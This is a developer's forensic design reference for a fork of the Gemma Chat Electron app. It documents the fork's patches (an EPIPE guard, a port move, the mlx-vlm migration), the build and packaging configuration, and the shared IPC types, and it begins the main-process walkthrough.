# Gemma Chat — Complete Application Design & Forensic Reference

> **Source of truth for the Gemma Chat Electron application as it exists in the MindXpansion fork.**
> Origin: `https://github.com/ammaarreshi/gemma-chat` (upstream) → `https://github.com/MindXpansion/gemma-chat` (working fork)
> Local working copy: `/Users/bear/Development/gemma-chat/`
> Documentation maintained by: Bear (Daryl Lantz) & Claude
> First captured: 2026-05-13 (after EPIPE crash + port-collision + HF Xet stall diagnostic session)

---

## Purpose of This Document

This is a **living, working reference** for the entire Gemma Chat application. The goal is operational mastery: every function, every constant, every IPC channel, every external dependency, every file path the app touches, every error path, and every assumption it makes about its environment is captured here.

Written so that if we read it cold six months from now, on a plane with no internet, we could explain or rebuild any specific behavior from memory.

This is **not** a tutorial, **not** a user manual, and **not** AI-generated summary fluff. It is a forensic, fact-driven reference produced by reading the actual source line by line, validated against observed runtime behavior.

---

## Methodology

For each file:

1. **Role** — what this file is responsible for in the system
2. **Imports** — what it depends on (and what that implies)
3. **Exports** — what other parts of the system can use
4. **Constants & module-level state** — every named thing at module scope
5. **Functions & types** — signature, behavior, side effects, error handling
6. **IPC contracts** — channels registered or invoked (main ↔ preload ↔ renderer)
7. **Filesystem & network surface** — every path written, every URL hit
8. **Known bugs, patches, observed runtime behavior** — what we've actually seen, not what the code claims

After per-file deep-dive, cross-cutting sections cover the architecture, state machine, lifecycle, dependency graph, and prioritized risk register.

---

## Document Status & Change Log

| Date (MT) | Author | Change |
|---|---|---|
| 2026-05-13 19:40 | Bear + Claude | Document initialized. File inventory complete. Three patches already applied to source (EPIPE guard in `main/index.ts`; port move 11434→11437 in `main/mlx.ts`); covered in §Patches Applied. |
| 2026-05-17 18:09 | Bear + Claude | Doc migrated into the repo at `docs/gemma-chat-app-design.md` for version-controlled maintenance. New private repo `MindXpansion/MindXpansion-Gemma-Chat` created as canonical home; public fork `MindXpansion/gemma-chat` left in place per Bear's directive. Patch 4 added: `mlx-lm` → `mlx-vlm` migration for Gemma 4 multimodal support. |

---

## Source File Inventory

Counted: **4,857 source lines** across 19 source files + 9 config/meta files.

### Main process (TypeScript, runs in Node/Electron main)
| Lines | Path | Role (preliminary) |
|---|---|---|
| 596 | `src/main/index.ts` | Electron app entrypoint, window lifecycle, IPC handler registration |
| 520 | `src/main/mlx.ts` | MLX runtime install + `mlx_lm.server` subprocess lifecycle + HF model management |
| 593 | `src/main/tools.ts` | Tool/function-calling integration (largest file — unknown content) |
| 397 | `src/main/workspace.ts` | Per-conversation workspace directories (the `c_<timestamp>_<rand>` dirs) |

### Preload (security bridge between main and renderer)
| Lines | Path | Role (preliminary) |
|---|---|---|
| 90 | `src/preload/index.ts` | Exposes safe APIs to renderer via `contextBridge` |
| 7 | `src/preload/index.d.ts` | TypeScript ambient types for the bridge |

### Renderer (React, runs in Chromium)
| Lines | Path | Role (preliminary) |
|---|---|---|
| 13 | `src/renderer/index.html` | HTML shell |
| 10 | `src/renderer/src/main.tsx` | React entry |
| 161 | `src/renderer/src/App.tsx` | Top-level component, routing, global state |
| 232 | `src/renderer/src/components/Setup.tsx` | First-run download / progress screen (the lying-spinner UI) |
| 591 | `src/renderer/src/components/Chat.tsx` | Conversation surface |
| 393 | `src/renderer/src/components/Message.tsx` | Individual message rendering |
| 283 | `src/renderer/src/components/Composer.tsx` | Input bar |
| 349 | `src/renderer/src/components/Canvas.tsx` | "Build" tab — code generation surface |
| 81 | `src/renderer/src/components/Sidebar.tsx` | Conversation list navigation |
| 101 | `src/renderer/src/lib/whisper.ts` | Voice input via Whisper (not previously discussed) |
| 305 | `src/renderer/src/styles.css` | Global styles (Tailwind + custom) |
| 11 | `src/renderer/src/env.d.ts` | Vite env types |

### Shared
| Lines | Path | Role (preliminary) |
|---|---|---|
| 124 | `src/shared/types.ts` | Type definitions used across main/preload/renderer |

### Configuration & meta
| Lines | Path |
|---|---|
| 44 | `package.json` |
| 31 | `electron.vite.config.ts` |
| 29 | `electron-builder.yml` |
| 7 | `tsconfig.json` |
| 17 | `tsconfig.node.json` |
| 18 | `tsconfig.web.json` |
| 134 | `README.md` |
| 21 | `LICENSE` |
| 41 | `.gitignore` |

---

## Table of Contents

1. Executive Summary & Architecture Overview *(pending)*
2. Build & Configuration Layer *(pending)*
   - `package.json`
   - `electron.vite.config.ts`
   - `electron-builder.yml`
   - `tsconfig*.json`
3. Main Process *(pending)*
   - `main/index.ts`
   - `main/mlx.ts`
   - `main/tools.ts`
   - `main/workspace.ts`
4. Preload Bridge *(pending)*
   - `preload/index.ts`
   - `preload/index.d.ts`
5. Shared Types *(pending)*
   - `shared/types.ts`
6. Renderer *(pending)*
   - Entry & top-level (`main.tsx`, `App.tsx`, `index.html`)
   - `Setup.tsx` (and the lying-spinner investigation)
   - `Chat.tsx`
   - `Message.tsx`
   - `Composer.tsx`
   - `Canvas.tsx`
   - `Sidebar.tsx`
   - `lib/whisper.ts`
   - `styles.css`
7. Cross-Cutting *(pending)*
   - IPC contract map (every channel, every direction)
   - Data flow diagram (model selection → download → server start → first inference)
   - State machine (Setup → Loading → Ready → Error → Recovery)
   - Filesystem footprint (every path the app writes or reads)
   - Network footprint (every URL the app contacts)
   - Process tree (npm → electron-vite → Electron → Python `mlx_lm.server`)
8. Patches Applied (Our Fork's Divergence from Upstream)
9. Known Issues, Observed Runtime Behavior, & Risk Register *(pending)*
10. Recommended Hardening Roadmap *(pending)*

---

## §8 Patches Applied (Our Fork's Divergence from Upstream)

These are real, in-source changes we have made to the MindXpansion fork during the 2026-05-13 diagnostic session. Upstream (`ammaarreshi/gemma-chat`) does not yet have these.

### Patch 1 — EPIPE guard in `src/main/index.ts`

**Symptom:** App crashed at startup with `Error: write EPIPE` traced into `console.log` inside `locateMLX()` at `out/main/index.js:132:21`. The Python MLX detection was actually succeeding; `console.log` itself was throwing because `process.stdout` was a pipe whose other end was closed before main-process startup completed.

**Fix:** Added an EPIPE guard at the very top of `src/main/index.ts`, immediately after the `electron` import:

```ts
// EPIPE guard — Electron main can lose stdout to a closed pipe at startup,
// which turns the first console.log into an uncaught exception that crashes the app.
// See locateMLX() in ./mlx for the first call that surfaces this.
process.stdout.on('error', (err: NodeJS.ErrnoException) => {
  if (err.code === 'EPIPE') return
  throw err
})
process.stderr.on('error', (err: NodeJS.ErrnoException) => {
  if (err.code === 'EPIPE') return
  throw err
})
```

**Verified:** Rebuild succeeded; subsequent `npm run start` no longer crashed at `locateMLX`.

**Upstream PR candidate:** Yes. This is a latent bug for anyone running the packaged build.

### Patch 2 — MLX server port move 11434 → 11437 in `src/main/mlx.ts`

**Symptom:** Bear's machine already runs Ollama, which auto-starts on login and binds `*:11434` (Ollama's documented default). Gemma Chat hardcoded `MLX_PORT = 11434` and would have failed with `OSError: [Errno 48] Address already in use` once the download phase completed. The first run didn't reveal this because the HF Xet download stall hit first.

**Fix:** Changed one line in `src/main/mlx.ts`:

```ts
const MLX_PORT = 11437  // was: 11434 — collides with Ollama default
```

`MLX_HOST` and `MLX_URL` derive from `MLX_PORT`, so a single-line change suffices.

**Verified:** Rebuilt `out/main/index.js` (verified `11437` present, `11434` absent). Ollama relaunched cleanly on 11434. `mlx_lm.server` bound to 11437 on subsequent runs.

**Upstream PR candidate:** Yes — but worth a discussion with upstream about whether to make it configurable rather than just shifting the magic number.

### Patch 3 — None yet on the renderer-vs-main IPC drift (the "lying spinner")

**Observed but not patched:** During HF downloads, the Setup screen reports "10%" or "12%" while `mlx_lm.server` has actually died silently (jetsam SIGKILL under memory pressure, or HF Xet protocol stall with no exception propagated). The renderer has no liveness check on the main-process MLX subprocess. To be diagnosed in §Renderer/Setup.tsx and §Cross-Cutting/state-machine.

> **Note on terminology:** After Patch 4 below, the subprocess is `mlx_vlm.server`, not `mlx_lm.server`. The failure pattern described above is unchanged — `mlx_vlm.server` has the same liveness-reporting gap, and may surface it more often under VLM memory pressure.

### Patch 4 — `mlx-lm` → `mlx-vlm` migration in `src/main/mlx.ts` (Gemma 4 multimodal)

**Motivation:** Gemma 4 — the latest grouping of Gemma models, released by Google in early May 2026 — is multimodal (vision + text). The MLX serving layer for vision-language models is the `mlx-vlm` package, not `mlx-lm`. To run the current generation of Gemma locally on Apple Silicon via MLX, the app must spawn `mlx_vlm.server` (not `mlx_lm.server`) and install the matching Python package into the dedicated venv.

**Fix:** ~10 substitutions in `src/main/mlx.ts`, all `mlx_lm` → `mlx_vlm` (and `mlx-lm` → `mlx-vlm` for the pip package name):

- `locateMLX()` venv probe: `import mlx_lm` → `import mlx_vlm`
- `installMLX()` pip install command: `mlx-lm>=0.24.0` → `mlx-vlm>=0.5.0`
- `installMLX()` post-install verification: same import swap
- `startServer()` subprocess spawn: `-m mlx_lm.server` → `-m mlx_vlm.server`
- `startServer()` log line documenting the spawn command
- Comments and log/error messages throughout (no behavioral effect, but kept consistent so future readers aren't misled)

**Other files affected:** None directly. The renderer never references the package name; the IPC contract speaks in terms of "MLX install progress" and "MLX server health," not "mlx_lm" or "mlx_vlm." This is why the swap is contained to a single file.

**Side effects to verify during deep dive:**
- `AVAILABLE_MODELS` in `src/shared/types.ts` — confirm the listed models are Gemma 4 (or otherwise multimodal-capable on `mlx-vlm`); a Gemma 2 text-only model listed here would silently fail to load on `mlx_vlm.server`.
- HuggingFace cache directories — `mlx-vlm` may write to a different cache path than `mlx-lm`, which would affect existing-installation detection.
- Memory footprint — vision-language models load both a vision encoder and a text decoder; the silent-jetsam failure pattern (Patch 3) may surface more often under VLM memory pressure than it did under text-only.

**Verified:** Local diff inspected line-by-line on 2026-05-17. Not yet rebuilt/tested end-to-end with the rebuilt `out/main/index.js` — verification belongs to the §Main Process / mlx.ts deep dive.

**Upstream PR candidate:** Conditional. Upstream `ammaarreshi/gemma-chat` may still target Gemma 1/2 text-only; pushing this swap upstream without making the package choice configurable would break their users. The right upstream contribution is probably a config flag (`mlx-lm` vs `mlx-vlm`) tied to the selected model — captured here for the §Recommended Hardening Roadmap.

---

# Section 1 — Build & Configuration Layer + Shared Types

This section establishes the ground truth for *how the application is assembled* and *what data contracts everything else depends on*. Everything in §§2–7 reads against this section. If something here is wrong, every later section inherits the error.

## 1.1 `package.json`

**Path:** `package.json` (44 lines, project root)

**Role:** npm manifest. Declares the Electron app's entry point, dev/build scripts, runtime dependencies, and dev dependencies. Read by `npm`, `electron`, `electron-builder`, and `electron-vite`.

### Fields of substantive interest

| Field | Value | Notes |
|---|---|---|
| `name` | `gemma-chat` | Used as artifact name in `electron-builder.yml` (`${name}-${version}.${ext}` → `gemma-chat-0.1.0.dmg`). |
| `version` | `0.1.0` | Embedded in DMG filename. Not bumped during the 2026-05-13 / 2026-05-17 sessions. |
| `description` | `Local AI chat on your Mac, powered by Gemma 3` | **STALE.** The app now targets Gemma 4 (see Patch 4 and `AVAILABLE_MODELS` below). Cosmetic, but trips up anyone reading the manifest for context. Captured in §Hardening Roadmap. |
| `main` | `./out/main/index.js` | Electron's main-process entry, written by `electron-vite build` from `src/main/index.ts`. The EPIPE crash (Patch 1) referenced `out/main/index.js:132:21`. |
| `author` | `Ammaar` | **STALE for this fork.** Upstream attribution still present; MindXpansion fork has not amended. Affects DMG metadata and any auto-update signature. Cosmetic for now; would matter if we ever publish updates. |
| `license` | `MIT` | MIT license file in repo root (21 lines). |
| `type` | `module` | All `.js` files in the package are ESM. `.ts` source compiles to ESM. Affects how `out/main/index.js` is loaded by Electron. |

### Scripts (every one, what it does, when we use it)

- `dev` → `electron-vite dev` — Runs the app in dev mode. Vite dev server for the renderer, hot-reloaded main/preload via `electron-vite`. **What we've been running tonight.**
- `build` → `electron-vite build` — Compiles `src/main`, `src/preload`, `src/renderer` into `out/`. Required before `start`, `pack`, or `dist`. **This is what rebuilds `out/main/index.js` so the EPIPE guard, the port move, and the mlx-vlm migration land in the executed file.**
- `start` → `electron-vite preview` — Launches Electron pointing at the built `out/` artifacts. Closest thing to a production-like run without packaging into a DMG.
- `pack` → `electron-vite build && electron-builder --dir` — Builds, then packages into `release/mac-arm64/Gemma Chat.app` *without* producing a DMG. Useful for sanity-checking the packaged-app behavior.
- `dist` → `electron-vite build && electron-builder` — Full distribution build: builds, packages, and produces the `gemma-chat-0.1.0.dmg`. Reads `electron-builder.yml`.
- `typecheck:node` → `tsc --noEmit -p tsconfig.node.json` — Type-checks main + preload + shared. No emit.
- `typecheck:web` → `tsc --noEmit -p tsconfig.web.json` — Type-checks renderer + preload (.d.ts) + shared. No emit.
- `typecheck` → both of the above in sequence. **No script runs `typecheck` as a precondition of `build` or `dist`.** Type errors do not block a build. This is a real gap — flagged for §Hardening Roadmap.

### Dependencies (runtime — ship inside the .app)

- `@electron-toolkit/preload ^3.0.1` — Convenience wrapper around `contextBridge` for safer preload patterns. Used in `src/preload/index.ts`.
- `@electron-toolkit/utils ^3.0.0` — Helpers used in `src/main/index.ts` (the `electronApp`, `optimizer`, `is` imports). `is.dev` etc.
- `@huggingface/transformers ^4.1.0` — In-renderer HF transformer runtime. **Notable:** also pulled in despite the fact that primary inference goes through the spawned `mlx_vlm.server` subprocess. Used by `src/renderer/src/lib/whisper.ts` for voice input (in-browser Whisper). Verify in §8 deep dive.
- `electron-updater ^6.3.9` — Auto-update client. Reads from `electron-builder.yml`'s `publish.url`, currently set to the placeholder `https://example.com/auto-updates`. **Auto-update is configured but will silently fail** because the URL is a placeholder. Captured for §Hardening Roadmap.
- `highlight.js ^11.11.1` — Syntax highlighting for code in chat messages (used in `src/renderer/src/components/Message.tsx`).
- `marked ^15.0.7` — Markdown → HTML renderer for assistant messages.

### Dependencies (dev — not shipped)

- `electron ^34.0.0` — Electron 34. Recent.
- `electron-builder ^25.1.8` — DMG packaging.
- `electron-vite ^3.0.0` — Vite-based build orchestrator for Electron's three contexts (main/preload/renderer).
- `vite ^6.0.11` — Underlying bundler.
- `react ^19.0.0` + `react-dom ^19.0.0` — React 19. **Important:** React 19 changed some semantics around `useEffect` cleanup and concurrent rendering — relevant when we get to §7 (Setup.tsx / Chat.tsx) and the lying-spinner bug.
- `@types/react ^19.0.7`, `@types/react-dom ^19.0.3` — Matching types.
- `@vitejs/plugin-react ^4.3.4` — React Fast Refresh / JSX plumbing for Vite.
- `tailwindcss ^3.4.17` + `postcss ^8.5.1` + `autoprefixer ^10.4.20` — CSS toolchain. `src/renderer/src/styles.css` is the entry; Tailwind configured implicitly via PostCSS pipeline (no `tailwind.config.js` was inventoried — verify in §7 styles deep dive).
- `typescript ^5.7.3` — TS compiler.
- `@types/node ^22.10.6` — Node typings for main/preload.
- `@electron-toolkit/tsconfig ^1.0.1` — Base tsconfigs extended by `tsconfig.node.json` and `tsconfig.web.json`.

### Notable absences

- **No test framework.** No Vitest, no Jest, no Playwright, no E2E. The "verification before completion" discipline currently rests entirely on manual run-and-see. Captured for §Hardening Roadmap — adding even minimal smoke tests around `mlx.ts` would have caught the port collision and the mlx-vlm import failure before they surfaced to the user.
- **No linter.** No ESLint, no Prettier (despite `.eslintignore` and `.prettierignore` being mentioned in `electron-builder.yml`'s file-exclusion list, neither config exists in the repo). Style is informal.
- **No `engines` field.** `mlx.ts` enforces Python ≥3.10 at runtime (see Patch reference at commit `3352e5b`), but Node version is unconstrained at the manifest level.

---

## 1.2 `electron.vite.config.ts`

**Path:** `electron.vite.config.ts` (31 lines, project root)

**Role:** Build configuration consumed by `electron-vite`. Tells Vite how to bundle each of the three Electron contexts (main, preload, renderer) separately.

### Structure

`defineConfig({ main, preload, renderer })` — one entry per context.

### `main` block (lines 6–13)

```ts
plugins: [externalizeDepsPlugin()],
resolve: { alias: { '@shared': resolve('src/shared') } }
```

- `externalizeDepsPlugin()` — **Critical for understanding the bundle.** Marks all `package.json` `dependencies` as external (not bundled into `out/main/index.js`). They're resolved at runtime from `node_modules`. This is why the .app bundle still needs `node_modules/` shipped (which `electron-builder` handles).
- `@shared` alias → `src/shared` so main can `import { AVAILABLE_MODELS } from '@shared/types'` (which `src/main/index.ts` line 3 does).

### `preload` block (lines 14–21)

Same shape as `main`: externalize deps, `@shared` alias. Preload runs in Electron's preload context, which has Node access but also is loaded into the renderer's window before page scripts.

### `renderer` block (lines 22–30)

- `plugins: [react()]` — Vite's React plugin (JSX, Fast Refresh).
- Two aliases: `@renderer` → `src/renderer/src`, and `@shared` → `src/shared`. So renderer code can do `import { SetupStatus } from '@shared/types'` and `import { Foo } from '@renderer/components/Foo'`.
- **No `externalizeDepsPlugin` here** — renderer dependencies (React, marked, highlight.js, @huggingface/transformers) *are* bundled into `out/renderer/`. This is normal for Electron renderers: bundled JS shipped to the Chromium context.

### What this file does *not* do

- No CSP configuration (handled in `src/main/index.ts` via Electron's `session.defaultSession.webRequest`).
- No environment-variable injection (no `define`).
- No source-map config (Vite defaults apply: source maps in dev, not in production builds).
- No build-output customization (uses electron-vite defaults: `out/main/`, `out/preload/`, `out/renderer/`).

---

## 1.3 `electron-builder.yml`

**Path:** `electron-builder.yml` (29 lines, project root)

**Role:** Production packaging configuration. Consumed by `electron-builder` during `npm run pack` and `npm run dist`. Tells it how to wrap `out/` into a `.app` and `.dmg`.

### Identity

- `appId: com.ammaar.gemmachat` — macOS bundle identifier. **STALE for this fork** (upstream's reverse-DNS). Affects macOS keychain entries, file associations, and any per-app launchd integration. Cosmetic until we ever distribute privately.
- `productName: Gemma Chat` — Display name on disk and in the Dock.

### Filesystem layout

- `directories.buildResources: build` — `build/` holds the .icns icon and any installer resources. `build/icon.iconset/` is gitignored (an intermediate); the final `build/icon.icns` is tracked.

### Files (what ships vs. what doesn't)

Exclusion patterns (lines 5–11) leave behind everything not needed at runtime:
- All of `src/` (compiled to `out/` already)
- Vite, TypeScript, ESLint, Prettier configs (build-time only)
- `.env*`, `.npmrc`, `pnpm-lock.yaml`, `dev-app-update.yml`
- VS Code workspace files

Notably **kept inside the .app**: `out/`, `node_modules/` (the runtime dependencies after externalization), and `package.json` (needed by Electron for `main` lookup and version metadata).

- `asarUnpack: resources/**` — Anything under `resources/` ships as loose files inside `.app/Contents/Resources/app.asar.unpacked/` instead of inside the asar archive. **No `resources/` directory exists in the repo yet** — this is dead config currently. Will become relevant if/when we ship pre-bundled Python or model files.

### macOS-specific

- `mac.icon: build/icon.icns` — Bundle icon.
- `mac.target: [{ target: dmg, arch: [arm64] }]` — **Apple Silicon ONLY.** No x86_64, no universal, no Linux, no Windows. A Mac on Intel cannot run this DMG. Captured for §Hardening Roadmap (or it may be a permanent intentional constraint — Gemma 4 inference performance on Intel Macs would be unusably slow anyway).
- `mac.category: public.app-category.productivity` — App Store category metadata.
- `mac.hardenedRuntime: true` — Required for notarization. We are not currently notarized (no `notarize:` block).
- `mac.gatekeeperAssess: false` — Skips local Gatekeeper validation during build.

### DMG

- `dmg.artifactName: ${name}-${version}.${ext}` → `gemma-chat-0.1.0.dmg`.

### Auto-update

- `publish.provider: generic` — Generic HTTP server.
- `publish.url: https://example.com/auto-updates` — **Placeholder.** `electron-updater` will attempt to fetch update manifests from a domain that returns nothing useful. Auto-update is wired but inert. Captured for §Hardening Roadmap.

### Other

- `npmRebuild: false` — Skips the post-install native-module rebuild step. Reasonable here because the only native-ish dep (`@huggingface/transformers`) uses prebuilt binaries.
- `electronDownload.mirror: https://npmmirror.com/mirrors/electron/` — **Notable:** Electron binary downloads pulled from npmmirror (a China-based mirror). Faster from some networks, slower or blocked from others. Inherited from upstream; reconsider for §Hardening Roadmap if this ever causes install issues for collaborators.

---

## 1.4 `tsconfig.json` + `tsconfig.node.json` + `tsconfig.web.json`

**Pattern:** TypeScript "project references." Root `tsconfig.json` is a thin orchestrator; the two real configs target the two type-checking contexts.

### Root `tsconfig.json` (7 lines)

```json
{ "files": [], "references": [
  { "path": "./tsconfig.node.json" },
  { "path": "./tsconfig.web.json" }
]}
```

Empty `files`, just composes the two project refs. `npm run typecheck` runs each in sequence.

### `tsconfig.node.json` (17 lines)

Extends `@electron-toolkit/tsconfig/tsconfig.node.json`.

- **Includes:** `electron.vite.config.*`, `src/main/**/*`, `src/preload/**/*`, `src/shared/**/*`.
- **`composite: true`** — enables project references; emits `.tsbuildinfo` (gitignored).
- **`types: ["electron-vite/node"]`** — pulls in electron-vite's node-context type declarations.
- **`paths.@shared/*`** → `src/shared/*` — matches the Vite alias so type-checking and runtime agree.

### `tsconfig.web.json` (18 lines)

Extends `@electron-toolkit/tsconfig/tsconfig.web.json`.

- **Includes:** `src/renderer/src/env.d.ts`, all of `src/renderer/src`, `src/preload/*.d.ts`, `src/shared/**/*`. The preload `.d.ts` is included here so the renderer knows the shape of `window.api` exposed by the bridge.
- **`composite: true`**.
- **`paths`** — `@renderer/*` → `src/renderer/src/*`, `@shared/*` → `src/shared/*`.

### Implication

Shared types in `src/shared/` are visible to **all three** Electron contexts. Main, preload, and renderer all type-check against the same `ChatMessage`, `SetupStatus`, etc. This is correct and important — it's the only mechanism keeping IPC contracts coherent across process boundaries.

---

## 1.5 `.gitignore` (filesystem hints for runtime)

**Path:** `.gitignore` (41 lines)

Most entries are unremarkable (`node_modules/`, `out/`, build artifacts). Two entries reveal runtime filesystem behavior the app depends on:

- `workspaces/` — **A runtime-managed directory.** Holds per-conversation working directories (the `c_<timestamp>_<rand>` dirs created by `src/main/workspace.ts`). Gitignored because it's user data, not source.
- `mlx-venv/` — **The auto-provisioned Python venv.** Created at runtime by `src/main/mlx.ts`'s `installMLX()` in the Electron `userData` directory (not in the repo root). Listed in `.gitignore` defensively in case any developer accidentally creates one inside the repo.
- Model-weight extensions (`*.gguf`, `*.safetensors`, `*.onnx`, `*.bin`, `*.pt`, `*.pth`) — defensive ignore. The app downloads weights via HuggingFace to the HF cache directory, not into the repo, so these are unlikely to appear here in practice, but the ignore prevents accidents.

---

## 1.6 `src/shared/types.ts` — The Contract Surface

**Path:** `src/shared/types.ts` (124 lines)

**Role:** Single source of truth for every type that crosses a process boundary. Imported by main, preload, and renderer alike. **If this file is wrong, the whole IPC system is wrong.**

### `SetupStage` (lines 1–7)

```ts
type SetupStage = 'checking' | 'installing-mlx' | 'starting-mlx'
  | 'downloading-model' | 'ready' | 'error'
```

The six legal values for `SetupStatus.stage`. **This is the state machine the Setup screen visualizes.** Every transition must come from `main/index.ts` over the `mlx:status` IPC channel (to be verified in §2). Anything the renderer thinks is a stage that isn't in this union is a bug.

**Observation for §7 / §9:** The lying-spinner bug means the renderer reports `downloading-model` with progress while the actual subprocess has died. The state machine itself is fine — the *liveness signal* feeding the state machine is the gap.

### `SetupStatus` (lines 9–16)

```ts
interface SetupStatus {
  stage: SetupStage
  message: string
  progress?: number       // 0..1
  bytesDone?: number
  bytesTotal?: number
  error?: string
}
```

The full payload sent on `mlx:status`. `progress` is a fraction; `message` is human-readable. `error` is populated only when `stage === 'error'` (convention — not type-enforced).

### `ToolCall` (lines 18–25)

```ts
interface ToolCall {
  id: string
  name: string
  args: Record<string, unknown>
  result?: string
  error?: string
  running?: boolean
}
```

Tool/function-calling payload. **`args` is `Record<string, unknown>` — no schema enforcement at the type layer.** Validation lives in `src/main/tools.ts` (verify in §4 deep dive). `running` is set true while the tool is in-flight, cleared when `result` or `error` populates. The shape supports the streaming-tool-use pattern (model emits a call, we execute and stream back the result).

### `Role` and `ChatMessage` (lines 27–38)

```ts
type Role = 'user' | 'assistant' | 'system' | 'tool'
interface ChatMessage {
  id: string
  role: Role
  content: string
  toolCalls?: ToolCall[]
  createdAt: number       // unix ms
  model?: string
  done?: boolean
  activity?: AgentActivity
}
```

The conversation atom. Note `activity` is a per-message live indicator (see `AgentActivity` below), which is why the Composer can show "thinking" / "generating" / "calling tool X" inline.

### `AgentMode` and `ChatRequest` (lines 40–48)

```ts
type AgentMode = 'chat' | 'code'
interface ChatRequest {
  conversationId: string
  messages: Array<{ role: Role; content: string; toolCalls?: ToolCall[] }>
  model: string
  enableTools: boolean
  mode: AgentMode
}
```

The IPC payload that fires inference. **`mode: 'code'` is the Canvas/Build tab path** — different system prompt, different tool subset (verify in §7 Canvas + §4 tools). `conversationId` ties everything: workspace lookup, message persistence, file-change events.

### `WorkspaceInfo`, `WorkspaceFile`, `FileChangeEvent` (lines 50–64)

```ts
interface WorkspaceInfo { conversationId; path; previewUrl }
interface WorkspaceFile { path; kind: 'file'|'dir'; size? }
interface FileChangeEvent { conversationId }
```

The workspace contract. `previewUrl` strongly suggests the Canvas tab serves the workspace via a local HTTP server (verify in §5 workspace.ts and §7 Canvas.tsx) — likely how generated HTML/JS gets previewed in-app. **This is directly relevant to the goal of "filesystem access on an approved basis"**: the workspace abstraction is the existing primitive we'd extend.

### `AgentActivity` (lines 66–70)

```ts
type AgentActivity =
  | { kind: 'idle' }
  | { kind: 'thinking'; chars?: number }
  | { kind: 'generating'; chars?: number }
  | { kind: 'tool'; tool: string; target?: string; chars?: number }
```

Discriminated union for the live activity strip under each message. `chars` lets the UI estimate progress within a phase. `tool.target` is e.g. the filename being edited when the active tool is a file-write tool.

### `StreamChunk` (lines 72–78)

```ts
type StreamChunk =
  | { type: 'token'; text: string }
  | { type: 'tool_call'; call: ToolCall }
  | { type: 'tool_result'; id: string; result?; error? }
  | { type: 'activity'; activity: AgentActivity }
  | { type: 'done' }
  | { type: 'error'; error: string }
```

**The streaming inference protocol.** Every chunk emitted by main → renderer during an in-progress chat takes one of these six shapes. The renderer's stream consumer (in `Chat.tsx`, to be deep-dived in §7) switches on `type`.

**Important contract:** The stream is terminated by exactly one of `{ type: 'done' }` or `{ type: 'error' }`. If neither arrives (which is what happens during the silent-jetsam failure mode), the renderer's stream consumer hangs indefinitely. **This is the structural root of the lying-spinner symptom** — not in this file, but the contract here is what allows it.

### `ModelInfo` and `AVAILABLE_MODELS` (lines 80–123)

```ts
interface ModelInfo {
  /** HuggingFace repo ID — used internally for mlx_lm */    // ← STALE comment
  name: string
  label: string
  size: string         // human-readable
  sizeBytes: number    // for download progress %
  description: string
  recommended?: boolean
}
```

**STALE comment:** `name` is "used internally for mlx_lm" — should now read `mlx_vlm` after Patch 4. Captured in §Hardening Roadmap. (Trivial one-word fix, but the kind of drift that compounds.)

`AVAILABLE_MODELS` (Gemma 4 lineup):

| `name` (HF repo) | `label` | `size` | `sizeBytes` | `recommended` |
|---|---|---|---|---|
| `mlx-community/gemma-4-e2b-it-4bit` | Gemma 4 E2B | 1.5 GB | 1.5×10⁹ | — |
| `mlx-community/gemma-4-e4b-it-4bit` | Gemma 4 E4B | 3 GB | 3.0×10⁹ | ✓ |
| `mlx-community/gemma-4-26b-a4b-it-4bit` | Gemma 4 27B MoE | 16 GB | 16×10⁹ | — |
| `mlx-community/gemma-4-31b-it-4bit` | Gemma 4 31B | 18 GB | 18×10⁹ | — |

All four are **4-bit quantized**, served from `mlx-community/` on HuggingFace. All four are described as multimodal ("Text + image + audio" in the E2B/E4B descriptions), consistent with `mlx-vlm` as the serving layer (Patch 4).

`DEFAULT_MODEL = 'mlx-community/gemma-4-e4b-it-4bit'` — the recommended E4B. First-run downloads ~3 GB to the HF cache.

**Side-effect to verify in §3 mlx.ts deep dive:** `sizeBytes` is a *user-friendly approximation* (1.5×10⁹ ≠ actual on-disk size). The Setup screen uses it to compute the download `progress` fraction. If actual download bytes diverge from `sizeBytes` materially, progress can read >100% or stall <100% even on success. This may contribute to the lying-spinner perception even when nothing has actually crashed.

---

## §1 Synthesis — what this layer tells us about the rest

1. **Three Electron contexts, one type vocabulary.** The `@shared` alias + `src/shared/types.ts` is the spine. Everything downstream is just code that pushes those types across IPC boundaries.
2. **Build outputs are flat and predictable** (`out/main/index.js`, `out/preload/index.js`, `out/renderer/`). When a patch doesn't seem to take effect, the rebuild step is the prime suspect — there is no caching layer that could mask source changes.
3. **The app is Apple-Silicon-only and assumes a managed Python venv at runtime.** This narrows the failure surface considerably but creates a hard floor (no Intel Macs, no Linux experiments) and adds a runtime install dance (the venv provisioning in `mlx.ts`).
4. **Auto-update, tests, lint, notarization, and macOS code-signing are all either placeholder or absent.** The current operational model is "build → run from your own machine." Shipping to another user requires §Hardening Roadmap items first.
5. **Stale upstream attribution everywhere:** `author: Ammaar`, `description: ... Gemma 3`, `appId: com.ammaar.gemmachat`, `ModelInfo.name` comment referencing `mlx_lm`. None are functional bugs but they're drift markers — the kind of thing that, when there's enough of it, makes a codebase feel un-owned.

Section 1 complete. Section 2 (`src/main/index.ts`) is next.

---

# Section 2 — Main Process: `src/main/index.ts`

**Path:** `src/main/index.ts` (596 lines)

**Role:** Electron main-process entry point. Owns the BrowserWindow lifecycle, registers every IPC handler the renderer is allowed to call, orchestrates the MLX setup/install/run flow, and runs the chat inference loop (including tool execution and live file streaming). This is the file the OS invokes when the app launches; everything else in main/ is reached through here.

This is the largest and most behaviorally complex file in the codebase after `tools.ts`. Read it carefully — most production bugs in this app surface through code in this file.

## 2.1 Imports & module-level state

### Imports (lines 1–47)

The first executable code is the EPIPE guard (lines 2–12, see Patch 1), inserted between the `electron` import and all other imports. The position matters: any `console.log` that fires before the guard installs can still crash the process. Placement is correct as-is — the only `console.*` calls in `index.ts` itself are inside callbacks that fire after `app.whenReady()`, well after this guard runs.

After the guard:

| Import | Source | Notable |
|---|---|---|
| `app, shell, BrowserWindow, ipcMain, nativeTheme, session, nativeImage` | `electron` | Standard set. `session` is used for permission handlers. |
| `join` | `path` | For resolving paths relative to compiled `__dirname` (= `out/main/`). |
| `electronApp, optimizer, is` | `@electron-toolkit/utils` | Electron app helpers; `is.dev` for dev-mode branches. |
| `AVAILABLE_MODELS` | `@shared/types` | Used for resolving model label by HF repo ID. |
| `locateMLX, installMLX, startServer, stopServer, hasModel, chatStream, listLocalModels, type MLXChatMessage` | `./mlx` | The MLX subprocess API. `hasModel` is imported but **not used in this file** — dead import, captured for §Hardening. |
